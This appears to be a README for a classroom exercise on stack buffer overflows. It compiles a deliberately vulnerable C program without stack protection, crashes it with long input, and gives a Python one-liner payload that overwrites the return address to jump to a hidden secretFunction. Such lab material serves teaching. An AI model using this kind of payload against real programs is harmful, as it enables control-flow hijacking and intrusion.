# stack buffer overflow example 

## list of files required
* vuln2.c

## instructions:
* compile: `gcc -o vuln2.out vuln2.c -fno-stack-protector`


## normal functioning
* input a small string, and the program will return a an integer
	* e.g., run `vuln2.out` and input 123 or AAA, it will return a normal integer

## anomalous functioning

* then input a big number e.g. 12222222222222222222222222222222222121321321321 it will return a number (such as 2147483648)
* the third time, enter a input that is very long e.g. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, the program will crash


## get address of secretFunction
* redirect `objdump -d vuln2.out` to a file
* look for secretFunction
* e.g. `0000000000400635 <secretFunction>:`
* this means the address is: 35 06 40 00 
	* the ordering is reverse due to [endianness](https://en.wikipedia.org/wiki/Endianness), 
	which we will not concern ourselves with at this point
* on the commad line, enter this: `python -c 'print "a"*40 + "\x35\x06\x40\x00"' | ./vuln2.out`
* you should see output that looks like this:
	<p>Congratulations!	 
		You have entered the secret function.
		Segmentation fault1</p>




## analysis
* obviously, the part that interests us the most is why secretFunction was invoked
* as before, our compilation process has ensured that the compiler doesn't check for stack overflows
* read the first reference below to understand details about how input was designed designed for the program vuln2.out that caused secretFunction() to be invoked


## references
* <https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/>
* <https://en.wikipedia.org/wiki/Stack_buffer_overflow>

## end

